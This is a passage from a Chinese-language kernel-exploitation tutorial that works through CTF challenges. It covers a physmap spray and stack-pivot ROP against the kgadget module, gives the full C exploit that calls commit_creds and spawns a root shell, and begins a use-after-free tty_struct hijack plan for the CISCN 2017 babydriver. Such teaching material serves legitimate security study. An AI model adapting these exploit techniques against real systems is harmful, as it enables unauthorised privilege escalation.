<li>我们大量使用<code>mmap</code>映射了大片用户内存到物理内存上，并且以页为单位构造相同的ROP链，因此此时我们只需要传递<code>direct mapping</code>中的某一个内核地址，如果我们<code>mmap</code>分配的内存达到了一定量级理论上我们随机挑一个内存直接映射区地址，大概率会跳转到我们用户态构建的ROP链上</li>
<li>最后就是我们ROP的基础，让我们的链位于栈上，我们所构造的ROP链目前是改不了了，但我们可以利用栈迁移的知识，通过栈迁移跳转到目标ROP上进行稳定提权</li>
</ul>
<h2 id="5-栈迁移以及偏移计算"><a href="#5-栈迁移以及偏移计算" class="headerlink" title="5.栈迁移以及偏移计算"></a>5.栈迁移以及偏移计算</h2><p>总结过后我们目前最后的点那就是进行栈迁移，但是如何进行栈迁移呢<br>经过我们之前的分析我们知道，在调用ioctl后，函数首先会对于其中的某些寄存器进行赋值操作，此时能够被咱们使用的是r8,r9了（不过这里暂时不太清楚，难道说是因为前面的寄存器都需要参与<code>ioctl</code>接下来的函数操作，而其他的寄存器由不尽数相连，无法构成迁移ROP？）<br>总之我们到r8、r9寄存器中填充我们的ROP链，也就是利用如下指令</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsp</span><span class="hljs-comment">; ret</span><br></code></pre></td></tr></table></figure>
<p>我们通过在r9中填入指令，然后到r8当中填入我们所猜测的地址，这样就将栈迁移到了我们所构造的mmap映射到的物理内存了，然后就进行ROP<br>这里同样找到该指令的地址</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0xffffffff811483d0</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsp</span> <span class="hljs-comment">; ret</span><br></code></pre></td></tr></table></figure>
<p>但是我们该如何执行到这里的指令呢，这里我们知道当我们进入内核态的时候，栈同时也会转移，并且内核态的栈会保存咱们用户态时寄存器的一些值，所以我们此时只需要将栈顶地址加上到达保存r9寄存器值得地址偏移就可以使得我们执行当时的指令了，这个具体偏移我们调试内核进行查找。<br>接下来我们先来查找一下kgadget的偏移，具体步骤在我之前的文章有讲解，也就是重新打包一下文件系统以及init脚本即可，链接如下：<br><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1706316-1-1.html">Linux内核PWN环境准备</a></p>
<p>然后我们开始调试内核查看偏移：<br>首先我们先利用ioctl系统调用执行我们猜测的地址，这里我们填入的是一个<code>add rsp val; ret</code>类型的指令，目的就是让该指令能ret到r9，而r9中存放的是咱们的<code>pop rsp; ret</code>指令，从而实现栈迁移，这里我们先到伪造的内存页的第一条指令打上断点：<br><img src="http://imgsrc.baidu.com/forum/pic/item/024f78f0f736afc3fefa26acf619ebc4b6451200.jpg" srcset="/img/loading.gif" lazyload></p>
<p>这里其实我填上的已经是找好的地址辣，但是目前我们假装不知道来寻找偏移，此时我们知道内核栈上应该存在6个<code>attrnba</code>的值，然后相隔1个又是他，这是attrnba师傅在写题的时候给的一个记号，如下：<br><img src="http://imgsrc.baidu.com/forum/pic/item/cefc1e178a82b901d843dafa368da9773812ef09.jpg" srcset="/img/loading.gif" lazyload><br>因此我们在此刻查找对应栈看是否有这样的布局，我们浅看一下发现果然如此！<br><img src="http://imgsrc.baidu.com/forum/pic/item/4e4a20a4462309f75b85b4db370e0cf3d6cad615.jpg" srcset="/img/loading.gif" lazyload><br>这里恰好跟我们预想的一致，而可以推算出r9寄存器值得地址保存在<code>0xffffc900001a7f98</code>，其实从旁边提示也知道是在这儿，而且底下得r8也确实是咱们猜测的地址，这里我们计算偏移也就是简单的减法：<code>0xffffc900001a7f98 - 0xffffc900001a7ed8 = 0xc0</code><br>可知我们需要找到的ROP的第一条语句应该是<code>add rsp, 0xc0</code>,可是一切并不如我们所料，在遍历vmlinux中并没发现这样的语句，但是我们找到了他的一个替代<br><code>add rsp, 0xa0; pop rbx; pop r12; pop r13; pop rbp; ret</code>,<br>这条指令也确实可以达成将栈增加0xc0的效果，然后之后就是正常的进行我们的rop链，这里我们构造ROP链是采取以下的方法<br><img src="http://imgsrc.baidu.com/forum/pic/item/d4628535e5dde71187d95b3fe2efce1b9c1661eb.jpg" srcset="/img/loading.gif" lazyload><br>最底下的ROP链也是咱们构造的执行相应函数提权的链条然后返回用户态。</p>
<h2 id="6-终极测试！"><a href="#6-终极测试！" class="headerlink" title="6.终极测试！"></a>6.终极测试！</h2><p>上面的步骤讲解完毕，我们就使用qemu进行测试<br><img src="/%5Bhttp:/imgsrc.baidu.com/forum/pic/item/a6efce1b9d16fdfab213de27f18f8c5495ee7bff.jpg" srcset="/img/loading.gif" lazyload></p>
<p>可以发现我们猜测的physmap中的任意地址，大概率都可以完成提权操作</p>
<p>下面是exp：</p>
<pre><code class="hljs">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;ctype.h&gt;
#include &lt;sys/mman.h&gt;

const size_t init_cred = 0xffffffff82a6b700;
const size_t commit_creds = 0xffffffff810c92e0;
const size_t prepare_kernel_cred = 0xffffffff810c9540;
const size_t swapgs_pop2_retuser = 0xFFFFFFFF81C00FB0 + 0x1B;
const size_t pop_rsp_ret = 0xffffffff811483d0;
const size_t add_rsp = 0xffffffff810737fe;
const size_t pop_rdi_ret = 0xffffffff8108c6f0;
const size_t ret = 0xffffffff810001fc;
long page_size;     //一页大小
int dev;
size_t* map_spray[16000];
size_t guess;   
size_t user_cs, user_ss, user_rflags, user_sp;


void save_status();
void info_log(char*);
void error_log(char*);
void getShell();
void makeROP(size_t*);

void info_log(char* str)&#123;
  printf(&quot;\033[0m\033[1;32m[+]%s\033[0m\n&quot;,str);
&#125;

void error_log(char* str)&#123;
  printf(&quot;\033[0m\033[1;31m%s\033[0m\n&quot;,str);
  exit(1);
&#125;
void save_status()&#123;
  __asm__(&quot;mov user_cs, cs;&quot;
          &quot;mov user_ss, ss;&quot;
          &quot;mov user_sp, rsp;&quot;
          &quot;pushf;&quot;
          &quot;pop user_rflags;&quot;
        );
  info_log(&quot;Status has been saved.&quot;);
&#125;

void getShell()&#123;
  info_log(&quot;Ready to get root........&quot;);
  if(getuid())&#123;
    error_log(&quot;Failed to get root!&quot;);
  &#125;
  info_log(&quot;Root got!&quot;);
  system(&quot;/bin/sh&quot;);
&#125;

void makeROP(size_t* space)&#123;
  int index = 0;
  for(; index &lt; (page_size / 8 - 0x30); index++)
    space[index] = add_rsp;
  for(; index &lt; (page_size / 8 - 0x10); index++)
    space[index] = ret;

  space[index++] = pop_rdi_ret;
  space[index++] = init_cred;
  space[index++] = commit_creds;
  space[index++] = swapgs_pop2_retuser;
  space[index++] = 0xDeadBeef;
  space[index++] = 0xdEADbEAF;
  space[index++] = (size_t)getShell;
  space[index++] = user_cs;
  space[index++] = user_rflags;
  space[index++] = user_sp;
  space[index++] = user_ss;
&#125;

int main()&#123;
  save_status();
  dev = open(&quot;/dev/kgadget&quot;, O_RDWR);
  if(dev &lt; 0)&#123;
    error_log(&quot;Cannot open device \&quot;/dev/kgadget\&quot;!&quot;);
  &#125;
  page_size = sysconf(_SC_PAGESIZE);    
  info_log(&quot;Spraying physmap...&quot;);

  map_spray[0] = mmap(NULL, page_size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  makeROP(map_spray[0]); 
  info_log(&quot;make done!&quot;);
  for(int i=1; i&lt;15000; i++)&#123;
    map_spray[i] = mmap(NULL, page_size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if(!map_spray[i])&#123;
      error_log(&quot;Mmap Failed!&quot;);
    &#125;
    memcpy(map_spray[i], map_spray[0], page_size);
  &#125;
  guess = 0xFFFF888000000000 + 0x7000000;
  info_log(&quot;Ready to ture to kernel.....&quot;);
  __asm__(&quot;mov r15, 0xdeadbeef;&quot;
          &quot;mov r14, 0xceadbeef;&quot;
          &quot;mov r13, 0xbeadbeef;&quot;
          &quot;mov r12, 0xaeadbeef;&quot;
          &quot;mov r11, 0xdeadbeef;&quot;
          &quot;mov r10, 0x123456;&quot;
          &quot;mov rbp, 0x1234567;&quot;
          &quot;mov rbx, 0x87654321;&quot;
          &quot;mov r9, pop_rsp_ret;&quot;
          &quot;mov r8, guess;&quot;
          &quot;mov rax, 0x10;&quot;
          &quot;mov rcx, 0x12344565;&quot;
          &quot;mov rdx, guess;&quot;
          &quot;mov rsi, 0x1bf52;&quot;
          &quot;mov rdi, dev;&quot;
          &quot;syscall;&quot;
        );
  return 0;
&#125;
</code></pre>
<h1 id="三-Linux-Kernel-Heap-UAF"><a href="#三-Linux-Kernel-Heap-UAF" class="headerlink" title="三 Linux Kernel Heap - UAF"></a>三 Linux Kernel Heap - UAF</h1><h2 id="例题：CISCN-2017-babydriver"><a href="#例题：CISCN-2017-babydriver" class="headerlink" title="例题：CISCN - 2017 - babydriver"></a>例题：CISCN - 2017 - babydriver</h2><p>典中典题,大伙珍惜,从中可以学到很多结构体的认识</p>
<h3 id="1-题目逆向"><a href="#1-题目逆向" class="headerlink" title="1.题目逆向"></a>1.题目逆向</h3><p>首先就是检查一些脚本</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span>                                                                                          <br>qemu-system-x86_64 -initrd core.cpio -kernel bzImage -append &#x27;console=ttyS0 root=/dev/ram oops=panic <br>    panic=1&#x27; -enable-kvm -monitor /dev/null -m 128M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep <br>    -s<br><br></code></pre></td></tr></table></figure>

<ol>
<li>单核单线程</li>
<li>开启smep(执行禁止)</li>
<li>在kvm64 和 +smep的情况下会自动开启KPTI</li>
</ol>
<p>以及文件系统的启动脚本</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br> <br>mount -t proc none /proc<br>mount -t sysfs none /sys<br>mount -t devtmpfs devtmpfs /dev<br>chown root:root flag<br>chmod 400 flag<br>exec 0&lt;/dev/console<br>exec 1&gt;/dev/console<br>exec 2&gt;/dev/console<br><br>insmod /lib/modules/4.4.72/babydriver.ko<br>chmod 777 /dev/babydev<br>echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;<br>setsid cttyhack setuidgid 1000 sh<br><br>umount /proc<br>umount /sys<br>poweroff -d 0  -f<br><br></code></pre></td></tr></table></figure>

<p>可以看到加载了一个<code>babydriver.ko</code>模块,大致就是需要逆这里<br>因此我们例行checksec一下</p>
<pre><code class="hljs">dawn@dawn-virtual-machine:~/KernelLearning/babydriver$ 
[*] &#39;/home/dawn/KernelLearning/babydriver/extract/lib/modules/4.4.72/babydriver.ko&#39;
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x0)
</code></pre>
<p>然后就开始我们的逆向过程,如下:</p>
<p>babydriver_init没必要看,大致意思就是注册了一个<code>/dev/babydev</code>的设备,下面看fops</p>
<pre><code class="hljs">.data:00000000000008C0                               ; ===========================================================================
.data:00000000000008C0
.data:00000000000008C0                               ; Segment type: Pure data
.data:00000000000008C0                               ; Segment permissions: Read/Write
.data:00000000000008C0                               _data segment align_32 public &#39;DATA&#39; use64
.data:00000000000008C0                               assume cs:_data
.data:00000000000008C0                               ;org 8C0h
.data:00000000000008C0                               public fops
.data:00000000000008C0                               ; file_operations fops
.data:00000000000008C0 C0 09 00 00 00 00 00 00 00 00+fops file_operations &lt;offset __this_module, 0, offset babyread, offset babywrite, 0, 0, 0, 0, \
.data:00000000000008C0 00 00 00 00 00 00 30 01 00 00+                                        ; DATA XREF: babydriver_init:loc_1AA↑o
.data:00000000000008C0 00 00 00 00 F0 00 00 00 00 00+                 offset babyioctl, 0, 0, offset babyopen, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, \
.data:00000000000008C0 00 00 00 00 00 00 00 00 00 00+                 0&gt;
.data:00000000000008C0 00 00 00 00 00 00 00 00 00 00+_data ends
.data:00000000000008C0 00 00 00 00 00 00 00 00 00 00+
</code></pre>
<p>这里也就是该设备的一个<code>file_operations</code>,实现了read,ioctl,open,write等函数,因此我们首先看open</p>
<pre><code class="hljs">int __fastcall babyopen(inode *inode, file *filp)
&#123;
  __int64 v2; // rdx

  _fentry__(inode, filp);
  babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 64LL);
  babydev_struct.device_buf_len = 64LL;
  printk(&quot;device open\n&quot;, 0x24000C0LL, v2);
  return 0;
&#125;
</code></pre>
<p>可以看到我们open的时候,他首先调用<code>kmem_cache_alloc_trace</code>函数分配了内核空间给全局变量<code>babydev_struct</code>的字段,然后赋值其中长度字段为64,然后我们来看ioctl函数</p>
<pre><code class="hljs">// local variable allocation has failed, the output may be wrong!
__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)
&#123;
  size_t v3; // rdx
  size_t v4; // rbx
  __int64 v5; // rdx

  _fentry__(filp, *(_QWORD *)&amp;command);
  v4 = v3;
  if ( command == 0x10001 )
  &#123;
    kfree(babydev_struct.device_buf);
    babydev_struct.device_buf = (char *)_kmalloc(v4, 0x24000C0LL);
    babydev_struct.device_buf_len = v4;
    printk(&quot;alloc done\n&quot;, 0x24000C0LL, v5);
    return 0LL;
  &#125;
  else
  &#123;
    printk(&amp;unk_2EB, v3, v3);
    return -22LL;
  &#125;
&#125;
</code></pre>
<p>这里可以看到我们可以通过该函数来重新分配内核堆块给全局变量<code>babydev_struct</code>,这样显得open有点多余了说<br>然后我们来看关键漏洞点,也就是release函数,或者说close函数,如下:</p>
<pre><code class="hljs">int __fastcall babyrelease(inode *inode, file *filp)
&#123;
  __int64 v2; // rdx

  _fentry__(inode, filp);
  kfree(babydev_struct.device_buf);
  printk(&quot;device release\n&quot;, filp, v2);
  return 0;
&#125;
</code></pre>
<p>可以看到他是释放掉了我们的全局变量指向的分配堆块,但并没有赋空值,所以存在一个悬垂指针供我们利用.<br>其余的read和write函数就是正常的读写,没必要单独贴出来.</p>
<h3 id="2-利用tty-struct达成提权"><a href="#2-利用tty-struct达成提权" class="headerlink" title="2.利用tty_struct达成提权"></a>2.利用<code>tty_struct</code>达成提权</h3><p>我们的<code>/dev</code>目录下面存在一个伪终端设备<code>/dev/ptmx</code>,该设备打开后会创建一个<code>tty_struct</code>结构体,其中同其他设备一样存在着<code>tty_operations</code>结构体,因此不难理解我们可以利用UAF来劫持该结构体,然后覆写其中的函数指针至我们的ROP链来达成提权效果,大致思路如下:</p>
<ol>
<li>分别打开两次, <code>/dev/babydev</code>,那么我们就能得到同时指向一个堆块的两个指针</li>
<li>我们通过ioctl函数来修改堆块的大小,改变成能劫持下面tty_struct的大小</li>
<li>然后我们释放掉其中一个设备,释放掉对应全局变量堆块,但是我们仍存在一个指向该释放堆块的指针</li>
<li>我们再打开<code>/dev/ptmx</code>设备,因此分配一个堆块来存放<code>tty_struct</code>结构体</li>
<li>我们就可以利用之前还剩余的那个指针来修改<code>tty_struct</code>指向我们构造的<code>fake_operations</code>(什么时候构造都可以,可以指向栈中,但是要在本步骤前熬)</li>
<li>之后我们调用<code>fake_operations</code>中的相关函数就可以达成任意代码执行,进而提权.</li>
</ol>
<p>其中最主要的地方其实就是我们需要知道<code>tty_struct</code>的大小,然后修改之前堆块的大小来满足释放的堆块重新分配了.我们接下来就是寻找他的大小,这里直接剧透为0x2e0</p>
<p>其中<code>tty_struct</code>结构体的大致情况如下,位于<code>include/linux/tty.h</code>中:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span> &#123;</span><br>	<span class="hljs-type">int</span>	magic;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kref</span> <span class="hljs-title">kref</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span> *<span class="hljs-title">dev</span>;</span>	<span class="hljs-comment">/* class device or NULL (e.g. ptys, serdev) */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_driver</span> *<span class="hljs-title">driver</span>;</span><br>	<span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_operations</span> *<span class="hljs-title">ops</span>;</span><br>	<span class="hljs-type">int</span> index;<br><br>	<span class="hljs-comment">/* Protects ldisc changes: Lock tty not pty */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ld_semaphore</span> <span class="hljs-title">ldisc_sem</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_ldisc</span> *<span class="hljs-title">ldisc</span>;</span><br><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">atomic_write_lock</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">legacy_mutex</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">throttle_mutex</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rw_semaphore</span> <span class="hljs-title">termios_rwsem</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">winsize_mutex</span>;</span><br>	<span class="hljs-comment">/* Termios values are protected by the termios rwsem */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ktermios</span> <span class="hljs-title">termios</span>, <span class="hljs-title">termios_locked</span>;</span><br>	<span class="hljs-type">char</span> name[<span class="hljs-number">64</span>];<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br>	<span class="hljs-type">int</span> count;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">winsize</span> <span class="hljs-title">winsize</span>;</span>		<span class="hljs-comment">/* winsize_mutex */</span><br><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>		<span class="hljs-type">spinlock_t</span> lock;<br>		<span class="hljs-type">bool</span> stopped;<br>		<span class="hljs-type">bool</span> tco_stopped;<br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> unused[<span class="hljs-number">0</span>];<br>	&#125; __aligned(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)) flow;<br><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>		<span class="hljs-type">spinlock_t</span> lock;<br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> *<span class="hljs-title">pgrp</span>;</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> *<span class="hljs-title">session</span>;</span><br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> pktstatus;<br>		<span class="hljs-type">bool</span> packet;<br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> unused[<span class="hljs-number">0</span>];<br>	&#125; __aligned(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)) ctrl;<br><br>	<span class="hljs-type">int</span> hw_stopped;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> receive_room;	<span class="hljs-comment">/* Bytes free for queue */</span><br>	<span class="hljs-type">int</span> flow_change;<br><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span> *<span class="hljs-title">link</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync</span>;</span><br>	<span class="hljs-type">wait_queue_head_t</span> write_wait;<br>	<span class="hljs-type">wait_queue_head_t</span> read_wait;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work_struct</span> <span class="hljs-title">hangup_work</span>;</span><br>	<span class="hljs-type">void</span> *disc_data;<br>	<span class="hljs-type">void</span> *driver_data;<br>	<span class="hljs-type">spinlock_t</span> files_lock;		<span class="hljs-comment">/* protects tty_files list */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">tty_files</span>;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> N_TTY_BUF_SIZE 4096</span><br><br>	<span class="hljs-type">int</span> closing;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *write_buf;<br>	<span class="hljs-type">int</span> write_cnt;<br>	<span class="hljs-comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work_struct</span> <span class="hljs-title">SAK_work</span>;</span> 				<span class="hljs-comment">//这里存在一个函数指针,可以泄露基地址</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_port</span> *<span class="hljs-title">port</span>;</span><br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure>

<p>其中值得注意的就是我们的<code>const struct tty_operations *ops;</code><br>它指向一个<code>tty_operations</code>结构体,它位于<code>include/linux/tty_driver.h</code>当中, 如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_operations</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span> * (*<span class="hljs-title">lookup</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">tty_driver</span> *<span class="hljs-title">driver</span>,</span><br><span class="hljs-class">			<span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">filp</span>, <span class="hljs-title">int</span> <span class="hljs-title">idx</span>);</span><br>	<span class="hljs-type">int</span>  (*install)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br>	<span class="hljs-type">void</span> (*remove)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br>	<span class="hljs-type">int</span>  (*open)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br>	<span class="hljs-type">void</span> (*close)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br>	<span class="hljs-type">void</span> (*shutdown)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>	<span class="hljs-type">void</span> (*cleanup)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>	<span class="hljs-type">int</span>  (*write)(<span class="hljs-keyword">struct</span> tty_struct * tty,<br>		      <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">int</span> count);<br>	<span class="hljs-type">int</span>  (*put_char)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> ch);<br>	<span class="hljs-type">void</span> (*flush_chars)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>	<span class="hljs-type">unsigned</span> <span class="hljs-title function_">int</span> <span class="hljs-params">(*write_room)</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tty_struct *tty)</span>;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-title function_">int</span> <span class="hljs-params">(*chars_in_buffer)</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tty_struct *tty)</span>;<br>	<span class="hljs-type">int</span>  (*ioctl)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>		    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg);<br>	<span class="hljs-type">long</span> (*compat_ioctl)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>			     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg);<br>	<span class="hljs-type">void</span> (*set_termios)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> ktermios * old);<br>	<span class="hljs-type">void</span> (*throttle)(<span class="hljs-keyword">struct</span> tty_struct * tty);<br>	<span class="hljs-type">void</span> (*unthrottle)(<span class="hljs-keyword">struct</span> tty_struct * tty);<br>	<span class="hljs-type">void</span> (*stop)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>	<span class="hljs-type">void</span> (*start)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>	<span class="hljs-type">void</span> (*hangup)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>	<span class="hljs-type">int</span> (*break_ctl)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">int</span> state);<br>	<span class="hljs-type">void</span> (*flush_buffer)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>	<span class="hljs-type">void</span> (*set_ldisc)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>	<span class="hljs-type">void</span> (*wait_until_sent)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">int</span> timeout);<br>	<span class="hljs-type">void</span> (*send_xchar)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">char</span> ch);<br>	<span class="hljs-type">int</span> (*tiocmget)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>	<span class="hljs-type">int</span> (*tiocmset)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>			<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-built_in">set</span>, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> clear);<br>	<span class="hljs-type">int</span> (*resize)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> winsize *ws);<br>	<span class="hljs-type">int</span> (*get_icount)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>				<span class="hljs-keyword">struct</span> serial_icounter_struct *icount);<br>	<span class="hljs-type">int</span>  (*get_serial)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> serial_struct *p);<br>	<span class="hljs-type">int</span>  (*set_serial)(<span class="hljs-keyword">struct</span> tty_struct 